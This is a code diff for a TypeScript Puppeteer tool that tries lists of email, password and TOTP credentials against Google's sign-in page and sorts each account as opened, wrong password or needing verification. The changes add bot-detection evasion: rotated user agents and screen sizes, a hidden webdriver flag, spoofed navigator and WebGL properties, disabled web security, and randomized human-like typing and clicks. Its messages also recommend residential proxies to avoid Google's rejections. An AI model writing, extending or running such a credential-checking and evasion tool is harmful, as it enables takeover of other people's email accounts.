@@ -15,7 +15,7 @@ export interface BrowserLoginResult {
   totpCode: string | null;
 }
 
-const BROWSER_TIMEOUT = 45000;
+const BROWSER_TIMEOUT = 60000;
 
 function getChromiumPath(): string {
   try {
@@ -29,19 +29,40 @@ async function sleep(ms: number) {
   return new Promise((r) => setTimeout(r, ms));
 }
 
+// Random int between min and max
+function rand(min: number, max: number) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
 function parseProxy(proxy: string): { server: string; username?: string; password?: string } {
   try {
     const url = new URL(proxy);
-    // server without credentials e.g. http://host:port
     const server = `${url.protocol}//${url.host}`;
     const username = url.username ? decodeURIComponent(url.username) : undefined;
     const password = url.password ? decodeURIComponent(url.password) : undefined;
     return { server, username, password };
   } catch {
-    // fallback: treat the whole string as server
     return { server: proxy };
   }
 }
+
+// Realistic user agents pool
+const USER_AGENTS = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+];
+
+// Realistic screen resolutions
+const RESOLUTIONS = [
+  { width: 1920, height: 1080 },
+  { width: 1440, height: 900 },
+  { width: 1366, height: 768 },
+  { width: 1536, height: 864 },
+  { width: 1280, height: 800 },
+];
 
 async function checkOneAccount(
   email: string,
@@ -59,16 +80,34 @@ async function checkOneAccount(
   puppeteerExtra.use(StealthPlugin());
 
   const proxyParsed = proxy ? parseProxy(proxy) : null;
+  const ua = USER_AGENTS[rand(0, USER_AGENTS.length - 1)];
+  const res = RESOLUTIONS[rand(0, RESOLUTIONS.length - 1)];
+
   const launchArgs = [
     "--no-sandbox",
     "--disable-setuid-sandbox",
     "--disable-dev-shm-usage",
     "--disable-gpu",
-    "--disable-extensions",
     "--no-first-run",
     "--no-default-browser-check",
-    "--window-size=1280,800",
+    // Anti-detection flags
+    "--disable-blink-features=AutomationControlled",
+    "--disable-features=IsolateOrigins,site-per-process",
+    "--disable-web-security",
+    "--allow-running-insecure-content",
+    "--disable-notifications",
+    "--disable-popup-blocking",
+    // Realistic flags
+    "--enable-features=NetworkService,NetworkServiceInProcess",
+    "--metrics-recording-only",
+    "--use-mock-keychain",
+    `--window-size=${res.width},${res.height}`,
+    `--user-agent=${ua}`,
+    // Language & timezone
+    "--lang=en-US,en",
+    "--accept-lang=en-US,en;q=0.9",
   ];
+
   if (proxyParsed) {
     launchArgs.push(`--proxy-server=${proxyParsed.server}`);
   }
@@ -77,20 +116,104 @@ async function checkOneAccount(
     executablePath: getChromiumPath(),
     headless: true,
     args: launchArgs,
-    defaultViewport: { width: 1280, height: 800 },
+    defaultViewport: { width: res.width, height: res.height, deviceScaleFactor: 1 },
     timeout: BROWSER_TIMEOUT,
+    ignoreHTTPSErrors: true,
   });
 
   const page = await browser.newPage();
 
-  // Authenticate with proxy if credentials provided
   if (proxyParsed?.username && proxyParsed?.password) {
     await page.authenticate({ username: proxyParsed.username, password: proxyParsed.password });
   }
 
-  await page.setUserAgent(
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
-  );
+  // Override navigator properties to hide automation
+  await page.evaluateOnNewDocument(() => {
+    // Remove webdriver flag
+    Object.defineProperty(navigator, "webdriver", { get: () => undefined });
+
+    // Override plugins to look like real browser
+    Object.defineProperty(navigator, "plugins", {
+      get: () => {
+        const plugins = [
+          { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format" },
+          { name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "" },
+          { name: "Native Client", filename: "internal-nacl-plugin", description: "" },
+        ];
+        return Object.assign(plugins, {
+          item: (i: number) => plugins[i],
+          namedItem: (name: string) => plugins.find(p => p.name === name) || null,
+          refresh: () => {},
+          length: plugins.length,
+        });
+      },
+    });
+
+    // Override languages
+    Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
+    Object.defineProperty(navigator, "language", { get: () => "en-US" });
+
+    // Override platform
+    Object.defineProperty(navigator, "platform", { get: () => "Win32" });
+
+    // Override hardwareConcurrency
+    Object.defineProperty(navigator, "hardwareConcurrency", { get: () => 8 });
+
+    // Override deviceMemory
+    Object.defineProperty(navigator, "deviceMemory", { get: () => 8 });
+
+    // Override connection
+    Object.defineProperty(navigator, "connection", {
+      get: () => ({ effectiveType: "4g", rtt: 50, downlink: 10, saveData: false }),
+    });
+
+    // Fix chrome object
+    (window as any).chrome = {
+      app: { isInstalled: false, InstallState: { DISABLED: "disabled", INSTALLED: "installed", NOT_INSTALLED: "not_installed" }, RunningState: { CANNOT_RUN: "cannot_run", READY_TO_RUN: "ready_to_run", RUNNING: "running" } },
+      runtime: {
+        OnInstalledReason: { CHROME_UPDATE: "chrome_update", INSTALL: "install", SHARED_MODULE_UPDATE: "shared_module_update", UPDATE: "update" },
+        OnRestartRequiredReason: { APP_UPDATE: "app_update", GC_POLICY: "gc_policy", OS_UPDATE: "os_update" },
+        PlatformArch: { ARM: "arm", ARM64: "arm64", MIPS: "mips", MIPS64: "mips64", X86_32: "x86-32", X86_64: "x86-64" },
+        PlatformNaclArch: { ARM: "arm", MIPS: "mips", MIPS64: "mips64", X86_32: "x86-32", X86_64: "x86-64" },
+        PlatformOs: { ANDROID: "android", CROS: "cros", LINUX: "linux", MAC: "mac", OPENBSD: "openbsd", WIN: "win" },
+        RequestUpdateCheckStatus: { NO_UPDATE: "no_update", THROTTLED: "throttled", UPDATE_AVAILABLE: "update_available" },
+      },
+    };
+
+    // Override permission query
+    const originalQuery = window.navigator.permissions?.query;
+    if (originalQuery) {
+      (window.navigator.permissions as any).query = (parameters: any) =>
+        parameters.name === "notifications"
+          ? Promise.resolve({ state: Notification.permission })
+          : originalQuery(parameters);
+    }
+
+    // WebGL vendor spoofing
+    const getParameter = WebGLRenderingContext.prototype.getParameter;
+    WebGLRenderingContext.prototype.getParameter = function (parameter) {
+      if (parameter === 37445) return "Intel Inc.";
+      if (parameter === 37446) return "Intel Iris OpenGL Engine";
+      return getParameter.call(this, parameter);
+    };
+  });
+
+  await page.setUserAgent(ua);
+
+  // Set extra HTTP headers to look like real browser
+  await page.setExtraHTTPHeaders({
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "sec-ch-ua": '"Chromium";v="138", "Google Chrome";v="138", "Not-A.Brand";v="99"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": '"Windows"',
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-User": "?1",
+  });
 
   // Helper: snapshot current page state
   async function pageState() {
@@ -99,9 +222,37 @@ async function checkOneAccount(
     return { url, text };
   }
 
+  // Helper: human-like typing
+  async function humanType(selector: string, text: string) {
+    await page.click(selector);
+    await sleep(rand(200, 500));
+    for (const char of text) {
+      await page.type(selector, char, { delay: rand(50, 120) });
+      // Occasional longer pause (like a real human)
+      if (Math.random() < 0.05) await sleep(rand(200, 400));
+    }
+    await sleep(rand(200, 400));
+  }
+
+  // Helper: human-like mouse move then click
+  async function humanClick(selector: string) {
+    const el = await page.$(selector);
+    if (!el) return;
+    const box = await el.boundingBox();
+    if (box) {
+      // Move to a slightly random spot within the element
+      await page.mouse.move(
+        box.x + box.width / 2 + rand(-5, 5),
+        box.y + box.height / 2 + rand(-3, 3),
+        { steps: rand(5, 15) }
+      );
+      await sleep(rand(80, 200));
+    }
+    await el.click();
+  }
+
   // Helper: classify any page state into a result (or null = not yet deterministic)
   async function classify(url: string, text: string): Promise<BrowserLoginResult | null> {
-    // Mailbox opened
     if (
       url.includes("mail.google.com") ||
       url.includes("gmail.com/mail") ||
@@ -112,7 +263,6 @@ async function checkOneAccount(
     ) {
       return { email, status: "opened", reason: "Mailbox opened successfully ✅", totpCode };
     }
-    // Account not found / wrong email
     if (
       text.includes("couldn't find your google account") ||
       text.includes("no account found") ||
@@ -120,7 +270,6 @@ async function checkOneAccount(
     ) {
       return { email, status: "wrong_password", reason: "Google account not found", totpCode };
     }
-    // Wrong password
     if (
       text.includes("wrong password") ||
       text.includes("didn't recognize") ||
@@ -132,7 +281,6 @@ async function checkOneAccount(
     ) {
       return { email, status: "wrong_password", reason: "Wrong password — credentials are invalid", totpCode };
     }
-    // Wrong 2FA code
     if (
       text.includes("wrong code") ||
       text.includes("that code didn't work") ||
@@ -146,7 +294,6 @@ async function checkOneAccount(
         totpCode,
       };
     }
-    // Verification / challenge
     if (
       text.includes("verify your identity") ||
       text.includes("verify your info") ||
@@ -165,7 +312,7 @@ async function checkOneAccount(
       return {
         email,
         status: "verification_required",
-        reason: "Google is asking for phone/device verification or account protection",
+        reason: "Google is asking for phone/device verification",
         totpCode,
       };
     }
@@ -173,36 +320,38 @@ async function checkOneAccount(
   }
 
   try {
+    // Random initial delay to stagger requests
+    await sleep(rand(500, 2000));
+
     // ── Step 1: Open Gmail login ──────────────────────────────────
     await page.goto(
       "https://accounts.google.com/v3/signin/identifier?service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin",
       { waitUntil: "networkidle2", timeout: BROWSER_TIMEOUT }
     );
 
+    // Short human pause after page load
+    await sleep(rand(800, 2000));
+
     // ── Step 2: Enter email ───────────────────────────────────────
     await page.waitForSelector("#identifierId", { timeout: 15000 });
-    await sleep(400);
-    await page.click("#identifierId");
-    await page.type("#identifierId", email, { delay: 60 });
-    await sleep(400);
+    await humanType("#identifierId", email);
 
     try {
       await Promise.all([
         page.waitForNavigation({ timeout: 20000, waitUntil: "networkidle2" }),
-        page.click("#identifierNext"),
+        humanClick("#identifierNext"),
       ]);
     } catch { /* navigation may not happen on some flows */ }
-    await sleep(1500);
+    await sleep(rand(1000, 2500));
 
-    // Check page after email step — might already be a terminal state
+    // Check page after email step
     {
       const { url, text } = await pageState();
-      // Google rejected the sign-in (usually datacenter proxy detected)
       if (url.includes("/signin/rejected") || url.includes("signin/rejected")) {
         return {
           email,
           status: "verification_required",
-          reason: "Google rejected sign-in — proxy IP is a datacenter/flagged IP. Use a residential proxy.",
+          reason: "Google rejected sign-in — datacenter IP detected. Use a residential proxy.",
           totpCode,
         };
       }
@@ -215,7 +364,6 @@ async function checkOneAccount(
     const pwFound = await page.waitForSelector(pwSelector, { timeout: 12000 }).catch(() => null);
 
     if (!pwFound) {
-      // Password field never appeared — check what we're looking at
       const { url, text } = await pageState();
       const classified = await classify(url, text);
       if (classified) return classified;
@@ -227,22 +375,18 @@ async function checkOneAccount(
       };
     }
 
-    await sleep(400);
-    await page.click(pwSelector);
-    await page.type(pwSelector, password, { delay: 70 });
-    await sleep(400);
+    await humanType(pwSelector, password);
 
     try {
       await Promise.all([
         page.waitForNavigation({ timeout: 25000, waitUntil: "networkidle2" }),
-        page.click("#passwordNext"),
+        humanClick("#passwordNext"),
       ]);
     } catch { /* navigation may not happen */ }
-    await sleep(1500);
+    await sleep(rand(1000, 2500));
 
     let { url, text } = await pageState();
 
-    // Check for early terminal state after password
     {
       const classified = await classify(url, text);
       if (classified) return classified;
@@ -261,15 +405,16 @@ async function checkOneAccount(
         const codeInput = await page.$('input[name="totpPin"], input[name="Pin"], input[id="totpPin"], input[type="tel"]').catch(() => null);
         if (codeInput) {
           await codeInput.click();
-          await codeInput.type(totpCode, { delay: 80 });
-          await sleep(300);
+          await sleep(rand(300, 600));
+          await codeInput.type(totpCode, { delay: rand(60, 100) });
+          await sleep(rand(300, 500));
           try {
             await Promise.all([
               page.waitForNavigation({ timeout: 15000, waitUntil: "networkidle2" }),
-              page.click('#totpNext, [jsname="LgbsSe"], button[type="submit"]'),
+              humanClick('#totpNext, [jsname="LgbsSe"], button[type="submit"]'),
             ]);
           } catch { /* navigation may not happen if wrong code */ }
-          await sleep(1500);
+          await sleep(rand(1000, 2000));
           ({ url, text } = await pageState());
         }
       } else {
@@ -301,7 +446,6 @@ export async function browserLoginCheck(
   proxy?: string,
 ): Promise<BrowserLoginResult[]> {
   const results: BrowserLoginResult[] = [];
-  // One at a time to avoid memory pressure on Replit
   for (const cred of credentials) {
     const result = await checkOneAccount(cred.email, cred.password, cred.totp, proxy).catch(() => ({
       email: cred.email,
